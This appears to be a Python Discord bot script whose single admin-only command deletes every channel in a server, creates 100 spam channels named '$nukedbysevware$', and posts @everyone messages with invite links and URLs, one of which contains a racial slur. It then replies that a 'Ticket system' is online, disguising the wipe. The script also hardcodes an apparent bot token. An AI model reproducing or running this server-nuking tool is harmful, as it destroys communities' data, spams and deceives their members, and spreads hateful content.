import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
@commands.has_permissions(administrator=True)
async def sevware(ctx):
    guild = ctx.guild

    delete_tasks = []
    for channel in guild.channels:
        delete_tasks.append(channel.delete())

    await asyncio.gather(*delete_tasks, return_exceptions=True)

    create_tasks = []
    for _ in range(100):
        create_tasks.append(guild.create_text_channel("$nukedbysevware$"))

    channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    send_tasks = []
    for ch in channels:
        if isinstance(ch, discord.TextChannel):
            send_tasks.append(ch.send("@everyone https://discord.gg/FaASg8z8 https://sevnfiles.vercel.app/ https://niggashop.vercel.app/"))

    await asyncio.gather(*send_tasks, return_exceptions=True)

    await ctx.send("⚡ Ticket system ONLINE (FAST MODE)")

bot.run("MTQyMjE2MzkwMjc1Nzg2NzU5MA.GJE1kL.izD0KMGan0gmg0JZ2faRCVpVNECXXgTdfkIEH0")